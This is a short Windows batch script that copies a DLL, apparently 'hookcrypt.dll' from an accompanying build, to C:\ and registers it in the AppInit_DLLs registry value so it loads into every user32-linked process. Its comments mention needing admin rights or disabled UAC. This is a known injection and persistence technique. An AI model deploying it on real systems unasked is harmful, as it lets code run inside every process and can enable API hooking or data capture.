:: This works by either running it from the basic cmd.exe or just double clicking it
:: The build must be called first to generate hookcrypt.dll
move %1 C:\
:: This might need to be hand added using 'regedit'
:: Or you might need to have UAC disabled
:: This works with admin privileges
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /t REG_SZ /d C:\%1